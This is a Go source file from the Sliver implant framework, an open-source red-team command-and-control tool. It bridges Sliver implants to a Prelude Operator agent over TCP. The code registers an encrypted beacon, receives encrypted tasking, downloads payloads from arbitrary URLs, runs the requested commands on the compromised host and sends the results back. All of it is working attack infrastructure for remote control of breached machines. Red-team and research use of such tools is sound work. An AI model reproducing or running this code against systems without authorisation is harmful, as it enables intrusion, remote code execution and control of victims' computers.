package bridge

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"context"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/bishopfox/sliver/client/prelude/config"
	"github.com/bishopfox/sliver/client/prelude/implant"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util"
)

const (
	delim = "\r\n"
)

type CommandRunner func(string, string, []byte, *OperatorImplantBridge, func(string, int, int)) (string, int, int)

// OperatorImplantBridge maps the Sliver implants (whether it be a beacon or a session)
// to a Prelude Operator implant with a TCP transport.
type OperatorImplantBridge struct {
	Conn           *net.Conn
	Implant        implant.ActiveImplant
	RPC            rpcpb.SliverRPCClient
	PBeacon        config.OperatorBeacon
	BeaconCallback func(string, func(*clientpb.BeaconTask))
	Config         config.AgentConfig
	RunCommand     CommandRunner

	recv chan []byte
	send chan []byte
}

func NewImplantBridge(c *net.Conn, a implant.ActiveImplant, rpc rpcpb.SliverRPCClient, pbeacon config.OperatorBeacon, conf config.AgentConfig, callback func(string, func(*clientpb.BeaconTask)), runner CommandRunner) *OperatorImplantBridge {
	return &OperatorImplantBridge{
		Conn:           c,
		Implant:        a,
		RPC:            rpc,
		Config:         conf,
		BeaconCallback: callback,
		PBeacon:        pbeacon,
		RunCommand:     runner,
		recv:           make(chan []byte),
		send:           make(chan []byte),
	}
}

func (a *OperatorImplantBridge) register() {
	data, err := json.Marshal(a.PBeacon)
	if err != nil {
		return
	}
	encrypted := util.PreludeEncrypt(data, []byte(a.Config.AESKey), nil)
	dataBuff := append([]byte(fmt.Sprintf("%x", encrypted)), "\n"...)
	(*a.Conn).Write(dataBuff)
}

func (a *OperatorImplantBridge) ReceiveLoop() {
	a.register()
	go func() {
		for {
			data := <-a.send
			encrypted := util.PreludeEncrypt(data, []byte(a.Config.AESKey), nil)
			dataBuff := append([]byte(fmt.Sprintf("%x", encrypted)), "\n"...)
			(*a.Conn).Write(dataBuff)
			time.Sleep(time.Duration(a.PBeacon.Sleep))
		}
	}()
	for {
		scanner := bufio.NewScanner(*a.Conn)
		for scanner.Scan() {
			msg := strings.TrimSpace(scanner.Text())
			a.handleMessage(msg)
		}
	}
}

func (a *OperatorImplantBridge) handleMessage(message string) {
	var tempBeacon config.OperatorBeacon
	decoded, err := hex.DecodeString(message)
	if err != nil {
		return
	}
	if err := json.Unmarshal(util.PreludeDecrypt(decoded, []byte(a.Config.AESKey)), &tempBeacon); err == nil {
		a.PBeacon.Links = a.PBeacon.Links[:0]
		a.runLinks(&tempBeacon)
	}
}

func (implantBridge *OperatorImplantBridge) runLinks(tempBeacon *config.OperatorBeacon) {
	for _, link := range implantBridge.Config.StartInstructions(tempBeacon.Links) {
		time.Sleep(time.Second * 1)
		var payload []byte
		if link.Payload != "" {
			payload, _ = requestPayload(link.Payload)
		}

		// If we're running on a Beacon
		if implantBridge.BeaconCallback != nil {
			implantBridge.RunCommand(link.Request, link.Executor, payload, implantBridge, func(response string, status int, pid int) {
				link.Response = response
				link.Status = status
				link.Pid = pid
				implantBridge.PBeacon.Links = append(implantBridge.PBeacon.Links, link)
				implantBridge.Config.EndInstruction(link)
				implantBridge.refreshBeacon()
				data, err := json.Marshal(implantBridge.PBeacon)
				if err != nil {
					return
				}
				implantBridge.send <- data
			})
			return
		}
		// Running on a Session
		response, status, pid := implantBridge.RunCommand(link.Request, link.Executor, payload, implantBridge, nil)
		link.Response = response
		link.Status = status
		link.Pid = pid
		implantBridge.PBeacon.Links = append(implantBridge.PBeacon.Links, link)
		implantBridge.Config.EndInstruction(link)
		implantBridge.refreshBeacon()
		data, err := json.Marshal(implantBridge.PBeacon)
		if err != nil {
			return
		}
		implantBridge.send <- data

	}
}

func requestPayload(target string) ([]byte, error) {
	resp, err := http.Get(target)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("invalid status code: %d", resp.StatusCode)
	}
	return ioutil.ReadAll(resp.Body)
}

func (a *OperatorImplantBridge) refreshBeacon() {
	var pwd string
	pwdResp, _ := a.RPC.Pwd(context.Background(), &sliverpb.PwdReq{
		Request: implant.MakeRequest(a.Implant),
	})
	if pwdResp != nil {
		pwd = pwdResp.Path
	}
	a.PBeacon.Sleep = a.Config.Sleep
	a.PBeacon.Range = a.Config.Range
	a.PBeacon.Pwd = pwd
	a.PBeacon.Target = a.Config.Address
	a.PBeacon.Executing = a.Config.BuildExecutingHash()

}
